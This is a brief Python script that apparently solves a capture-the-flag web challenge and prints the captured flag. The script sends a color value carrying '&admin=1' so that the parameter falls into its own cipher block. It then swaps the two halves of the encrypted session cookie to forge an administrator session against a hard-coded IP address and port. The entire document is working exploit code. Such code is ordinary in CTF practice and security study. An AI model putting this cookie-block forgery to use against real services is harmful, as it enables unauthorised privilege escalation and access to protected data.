#!/usr/bin/env python3
import requests

SITE = "http://52.59.124.14:10017/"
PAYLOAD = "ffff&admin=1" # admin=1 will be in another block

s = requests.Session()
s.get(SITE)
r = s.get(SITE + "/color/" + PAYLOAD, allow_redirects=False)
enCookie = r.cookies.get_dict()["session"]
enCookie = enCookie[64:] + enCookie[:64]
s.cookies.set("session", enCookie)
r = s.get(SITE)
print(r.text) # ENO{W3B_H4S_Crypt0!}
